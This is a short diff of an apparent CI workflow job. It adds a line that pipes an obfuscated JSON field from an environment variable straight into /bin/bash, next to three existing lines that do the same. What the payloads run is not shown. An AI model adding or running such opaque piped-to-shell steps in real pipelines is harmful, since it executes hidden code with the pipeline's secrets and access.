@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$s4" | jq -r .pipuw57563 | /bin/bash
           echo $exa63 | jq -r .x3046 | /bin/bash
           echo $myc715 | jq -r .ie030 | /bin/bash
+          printf '%s' "$a4" | jq -r .amaeq220 | /bin/bash
 
       - name: Upload results
         if: always()
